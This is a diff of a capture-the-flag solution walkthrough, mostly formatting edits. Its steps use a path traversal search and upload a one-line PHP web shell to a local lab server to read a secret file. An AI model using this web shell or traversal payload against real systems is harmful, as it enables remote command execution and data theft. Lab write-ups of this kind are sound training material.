@@ -15,16 +15,16 @@ Challenge 2: Exploit a vulnerability in the given PHP file upload functionality.
 
 ## Solution :-
 
-1.	Access localhost:8000
+1.	Access `localhost:8000`
 2.	Go to Challenge 1
-3.	Search for “../../secret”
-4.	Copy the flag you see (call it flag1)
-5.	Go back to localhost:8000
+3.	Search for `../../secret`
+4.	Copy the flag you see
+5.	Go back to `localhost:8000`
 6.	Go to Challenge 2
-7.	Upload a php script (let’s say backdoor.php) with “<?php system($_GET['cmd']); ?>”
-8.	Access localhost:8000/challenge2/uploads/backdoor.php?cmd=cat%20secret.php
-9.	Check the network tab with the above request; you will find the flag in the response (lets call it flag2)
-10.	Concatenate both flags and enclose them in `CTF_SDaT{}` to get the final flag.
+7.	Upload a php script (let’s say backdoor.php) with `<?php system($_GET['cmd']); ?>`
+8.	Access `localhost:8000/challenge2/uploads/backdoor.php?cmd=cat%20secret.php`
+9.	Check the network tab with the above request; you will find the flag in the response
+10.	Concatenate both flags and enclose them in `CTF_SDaT{}` to get the final flag
 
 ## Final Flag 
 
